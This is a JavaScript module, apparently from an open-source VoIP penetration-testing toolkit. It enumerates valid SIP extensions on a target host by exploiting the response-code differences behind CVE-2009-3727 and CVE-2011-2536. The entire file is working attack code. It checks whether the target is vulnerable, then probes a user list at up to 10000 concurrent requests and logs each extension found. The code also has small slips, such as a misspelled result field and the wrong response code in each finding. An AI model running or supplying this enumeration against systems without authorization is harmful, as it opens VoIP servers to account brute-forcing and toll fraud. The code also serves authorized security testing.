/*
  Copyright Jesús Pérez <jesusprubio@gmail.com>

  This code may only be used under the MIT license found at
  https://opensource.org/licenses/MIT.
*/

'use strict';

const bruteComOpts = require('../../../cfg/commonOpts/bruteCred');
const sipComOpts = require('../../../cfg/commonOpts/sip');
const utils = require('../../../lib/utils');
const logger = require('../../../bin/utils/logger');
const sipProto = require('../../../lib/protocols/sip');

const dbg = utils.dbg(__filename);

const Promise = utils.Promise;
const commonOpts = {};
utils.defaultsDeep(commonOpts, bruteComOpts, sipComOpts);
commonOpts.rport.default = 5060;
// We have the control of this library so we can take more "risk" here
commonOpts.meth.concurrency = 10000;

// We reuse the brute method but it's simpler here, so we don't
// need this options.
delete commonOpts.passwords;
delete commonOpts.userAssPass;


module.exports.desc = 'SIP extension brute-force (CVE-2009-3727/AST-2009-008,' +
                      'CVE-2011-2536/AST-2011-011) and others.';

module.exports.opts = commonOpts;


// We can't reuse the "brute" implementation here, we should
// complicate it a lot.
module.exports.impl = (opts = {}) =>
  new Promise((resolve, reject) => {
    dbg('Starting, opts', opts);
    const nonExistentExt = 'nideconha';
    const checkOpts = opts;
    const result = {
      vunerable: false,
      auth: true,
    };

    checkOpts.fromExt = nonExistentExt;
    checkOpts.toExt = nonExistentExt;

    dbg('Sending', checkOpts);
    sipProto.map(opts.rhost, checkOpts)
    .then((res) => {
      dbg('Response received', { nonExistentExt, code: res.code });

      if (res && res.code && utils.includes(['401', '407', '200'], res.code)) {
        let toPrint = `Host not vulnerable (${opts.meth})`;
        if (res.code === '200') {
          toPrint = `${toPrint} (no auth)`;
          result.auth = false;
        }
        logger.info(toPrint);
        resolve(result);
        return;
      }

      if (res.code) { result.codeBase = res.code; }

      if (opts.onlyCheck) {
        logger.info('Host vulnerable', { meth: opts.method, codeBase: result.codeBase });
        result.vulnerable = true;
        resolve(result);
        return;
      }

      result.valids = [];
      let actives = 0;
      let nextExt = opts.users.next();

      dbg('Starting the interval', { nextExt });
      const interval = setInterval(() => {
        if (actives > opts.concurrency) {
          dbg('Too much actives, skipping ...', { actives });
          return;
        }

        if (nextExt.done) {
          // Waiting untill all finish.
          dbg('Hosts finished, waiting for all the requests to finish');
          if (actives === 0) {
            dbg('Done, all finished now, dropping the interval');
            resolve(result);
            clearInterval(interval);
          }
          return;
        }

        const actualExt = nextExt.value;
        // To let it ready for the next time.
        nextExt = opts.users.next();

        dbg('Starting for', actualExt);

        const finalOpts = opts;
        finalOpts.fromExt = actualExt;
        finalOpts.toExt = actualExt;

        actives += 1;
        dbg('Sending', finalOpts);
        sipProto.map(opts.rhost, finalOpts)
        .then((resSecond) => {
          actives -= 1;
          dbg('Response received', { actualExt, code: resSecond.code });

          if (resSecond && resSecond.code && resSecond.code !== result.codeBase) {
            dbg('Valid extension found', { actualExt });
            const partialRes = {
              ext: actualExt,
              code: res.code,
              codeBase: result.codeBase,
            };

            result.valids.push(partialRes);
            logger.result(`${actualExt} ${logger.emoji('ok_hand')}`);
          } else {
            logger.info(actualExt);
          }
        })
        .catch((err) => {
          actives -= 1;
          reject(err);
          clearInterval(interval);
        });
      }, opts.delay);
    })
    .catch(err => reject(err));
  });
